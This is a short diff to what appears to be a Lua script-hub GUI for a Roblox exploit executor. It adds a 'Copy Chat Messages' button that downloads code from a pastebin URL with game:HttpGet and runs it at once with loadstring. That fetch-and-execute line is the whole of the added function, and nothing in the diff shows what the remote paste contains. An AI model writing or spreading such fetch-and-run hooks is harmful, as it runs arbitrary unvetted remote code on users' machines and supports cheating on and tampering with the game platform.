@@ -678,6 +678,14 @@ Execute6.TextSize = 14.000
 
 UICorner_21.Parent = Execute6
 
+-- 6 Scripts Button Functions and Names:
+
+ScriptName1.Text = "Copy Chat Messages"
+Execute1.MouseButton1Down:connect(function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/NWMaSHhe'),true))()
+Notification:Create("Script: Successfully Executed "..ScriptName1.Text.."!",5)
+end)
+
 -- Button Functions:
 
 Close.MouseButton1Down:connect(function()
